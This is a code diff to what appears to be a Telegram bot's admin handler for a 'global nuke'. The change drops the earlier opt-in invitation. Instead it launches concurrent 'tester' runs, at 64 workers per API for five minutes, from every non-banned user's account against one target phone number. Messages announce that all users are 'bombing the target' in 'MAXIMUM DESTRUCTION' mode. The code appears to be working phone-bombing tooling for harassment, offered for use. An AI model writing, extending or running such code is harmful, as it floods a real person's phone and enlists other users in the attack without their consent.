@@ -115,7 +115,7 @@ async def cbGlobalNuke(callback: CallbackQuery, state: FSMContext) -> None:
 async def handleGlobalNukePhone(message: Message, state: FSMContext) -> None:
     if not isAdmin(message.from_user.id):
         return
-    from bot.handlers.test_flow import parsePhones
+    from bot.handlers.test_flow import parsePhones, activeRunners, dashboardTasks, summaryShown, activeRecordIds, buildSummaryText, finishedKeyboard, dashboardLoop
     phones = parsePhones(message.text or "")
     if not phones or len(phones) != 1:
         await message.answer("Enter exactly one 10-digit target number for global nuke.")
@@ -123,52 +123,113 @@ async def handleGlobalNukePhone(message: Message, state: FSMContext) -> None:
     phone = phones[0]
     await state.clear()
 
-    # Broadcast nuke invite to all users
-    users  = db.getAllUsers(offset=0, limit=99999)
-    sent   = 0
-    failed = 0
+    users   = db.getAllUsers(offset=0, limit=99999)
+    active  = [u for u in users if not u["isBanned"]]
+    launched = 0
+    failed   = 0
 
-    builder = InlineKeyboardBuilder()
-    builder.button(text="LAUNCH NUKE", callback_data=f"nuke:launch:{phone}")
-    builder.adjust(1)
-
-    broadcastText = (
-        f"{b('GLOBAL NUKE INCOMING')}\n\n"
-        f"Target  {c(phone)}\n\n"
-        f"{i('Admin has initiated a global nuke.')}\n"
-        f"{i('Tap the button below to join the attack.')}\n"
-        f"{i('Everyone fires simultaneously.')}"
-    )
-
-    status = await message.answer(f"Sending global nuke to {len(users)} users...")
-    for u in users:
-        if u["userId"] == message.from_user.id:
-            continue
-        if u["isBanned"]:
-            continue
-        try:
-            await message.bot.send_message(
-                u["userId"],
-                broadcastText,
-                reply_markup=builder.as_markup(),
-                parse_mode=PM
-            )
-            sent += 1
-        except Exception:
-            failed += 1
-
-    # Also launch for admin
-    builder2 = InlineKeyboardBuilder()
-    builder2.button(text="Admin Menu", callback_data="adm:menu")
-    await status.edit_text(
-        f"{b('Global Nuke Launched')}\n\n"
+    status = await message.answer(
+        f"{b('Global Nuke Launching...')}\n\n"
         f"Target   {c(phone)}\n"
-        f"Invited  {c(str(sent))} users\n"
-        f"Failed   {c(str(failed))}\n\n"
-        f"{i('Users who tap Launch will join the attack.')}",
-        reply_markup=builder2.as_markup(),
+        f"Users    {c(str(len(active)))}\n\n"
+        f"{i('Launching nuke for every user simultaneously...')}",
         parse_mode=PM
     )
+
+    from bot.services.tester_runner import TesterRunner
+    import asyncio
+
+    async def launchForUser(u: dict) -> bool:
+        userId = u["userId"]
+        try:
+            # Skip if already running
+            if userId in activeRunners:
+                return False
+
+            runner = TesterRunner(
+                phone=phone,
+                duration=300,   # 5 min
+                workers=64,
+                useProxy=False,
+                userId=userId,
+                bot=message.bot,
+                nukeMode=True,
+            )
+            activeRunners[userId]  = runner
+            summaryShown[userId]   = False
+
+            # Record in DB
+            db.incrementTestCount(userId)
+            recordId = db.startTestRecord(userId, phone, 300, 64)
+            activeRecordIds[userId] = recordId
+
+            await runner.start()
+
+            # Notify user
+            try:
+                await message.bot.send_message(
+                    userId,
+                    f"{b('GLOBAL NUKE ACTIVE')}\n\n"
+                    f"Target  {c(phone)}\n"
+                    f"Mode    {c('MAXIMUM DESTRUCTION')}\n\n"
+                    f"{i('Admin launched a global nuke. You are part of it.')}",
+                    parse_mode=PM
+                )
+            except Exception:
+                pass
+
+            # Run dashboard in background
+            asyncio.create_task(
+                _globalNukeWatcher(runner, userId, phone, message.bot)
+            )
+            return True
+        except Exception:
+            return False
+
+    # Launch all simultaneously
+    results = await asyncio.gather(*[launchForUser(u) for u in active], return_exceptions=True)
+    launched = sum(1 for r in results if r is True)
+    failed   = len(active) - launched
+
+    builder = InlineKeyboardBuilder()
+    builder.button(text="Admin Menu", callback_data="adm:menu")
+    await status.edit_text(
+        f"{b('Global Nuke Launched')}\n\n"
+        f"Target    {c(phone)}\n"
+        f"Launched  {c(str(launched))} users\n"
+        f"Failed    {c(str(failed))}\n"
+        f"Duration  {c('5 minutes')}\n"
+        f"Workers   {c('64 per API')}\n\n"
+        f"{i('All users are now bombing the target simultaneously.')}",
+        reply_markup=builder.as_markup(),
+        parse_mode=PM
+    )
+
+
+async def _globalNukeWatcher(runner, userId: int, phone: str, bot) -> None:
+    """Wait for nuke to finish then clean up and notify user."""
+    from bot.handlers.test_flow import activeRunners, summaryShown, activeRecordIds, buildSummaryText, finishedKeyboard, _saveHistory
+    import asyncio
+
+    # Wait for runner to stop
+    while runner.isRunning:
+        await asyncio.sleep(2)
+
+    snap = runner.stats.snapshot()
+    _saveHistory(userId, snap)
+
+    activeRunners.pop(userId, None)
+    summaryShown.pop(userId, None)
+    activeRecordIds.pop(userId, None)
+
+    try:
+        await bot.send_message(
+            userId,
+            buildSummaryText(snap, [phone]),
+            parse_mode="HTML"
+        )
+    except Exception:
+        pass
 
 
 # ---------------------------------------------------------------------------
